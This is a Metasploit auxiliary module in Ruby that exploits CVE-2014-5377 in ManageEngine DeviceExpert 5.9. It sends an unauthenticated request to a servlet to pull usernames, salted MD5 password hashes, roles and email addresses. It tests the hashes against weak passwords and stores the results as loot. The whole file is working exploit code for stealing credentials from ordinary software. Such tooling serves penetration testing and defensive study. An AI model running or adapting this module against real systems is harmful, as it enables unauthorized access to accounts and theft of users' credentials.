##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'ManageEngine DeviceExpert User Credentials',
      'Description'    => %q{
          This module extracts usernames and salted MD5 password hashes
        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.

        This module has been tested successfully on DeviceExpert
        version 5.9.7 build 5970.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit
          'Brendan Coles <bcoles[at]gmail.com>'  # msf
        ],
      'References'     =>
        [
          ['EDB'       => '34449'],
          ['OSVBD'     => '110522'],
          ['CVE'       => '2014-5377']
        ],
      'DisclosureDate' => 'Aug 28 2014'))
    register_options(
      [
        Opt::RPORT(6060),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ], self.class)
    deregister_options('RHOST')
  end

  def check
    get_users ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def get_users
    users = nil
    vprint_status "#{peer} - Reading users from master..."
    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet')
    if !res
      vprint_error "#{peer} - Connection failed"
    elsif res.code == 404
      vprint_error "#{peer} - Could not find 'ReadUsersFromMasterServlet'"
    elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\/discoverydata>/
      users = res.body.scan(/<discoverydata>(.*?)<\/discoverydata>/)
      vprint_good "#{peer} - Found #{users.length} users"
    else
      vprint_error "#{peer} - Could not find any users"
    end
    users
  end

  def parse_user_data(user)
    return if user.nil?
    username = user.scan(/<username>([^<]+)</).flatten.first
    encoded_hash = user.scan(/<password>([^<]+)</).flatten.first
    role = user.scan(/<userrole>([^<]+)</).flatten.first
    email = user.scan(/<emailid>([^<]+)</).flatten.first
    salt = user.scan(/<saltvalue>([^<]+)</).flatten.first
    hash = Rex::Text.decode_base64(encoded_hash).unpack('H*').flatten.first
    ['12345', 'admin', 'password', username].each do |weak_password|
      if hash == Rex::Text.md5(weak_password + salt)
        print_status "#{peer} - Found weak credentials (#{username}:#{weak_password})"
        break
      end
    end
    [username, hash, role, email, salt]
  end

  def run
    users = get_users
    return if users.nil?
    cred_table = Rex::Ui::Text::Table.new(
      'Header'  => 'ManageEngine DeviceExpert User Credentials',
      'Indent'  => 1,
      'Columns' => ['Username', 'Password Hash', 'Role', 'E-mail', 'Password Salt']
    )
    vprint_status "#{peer} - Parsing user data..."
    users.each do |user|
      record = parse_user_data user.to_s
      unless record.join.empty?
        report_auth_info(
          'host'  => rhost,
          'port'  => rport,
          'sname' => (ssl ? 'https' : 'http'),
          'user'  => record[0],
          'pass'  => record[1],
          'type'  => 'hash',
          'proof' => "salt: #{record[4]} role: #{record[2]} email: #{record[3]}",
          'source_type' => 'vuln'
        )
        cred_table << [record[0], record[1], record[2], record[3], record[4]]
      end
    end
    print_line
    print_line "#{cred_table}"
    loot_name     = 'manageengine.deviceexpert.user.creds'
    loot_type     = 'text/csv'
    loot_filename = 'manageengine_deviceexpert_user_creds.csv'
    loot_desc     = 'ManageEngine DeviceExpert User Credentials'
    p = store_loot(
      loot_name,
      loot_type,
      rhost,
      cred_table.to_csv,
      loot_filename,
      loot_desc)
    print_status "Credentials saved in: #{p}"
  end
end
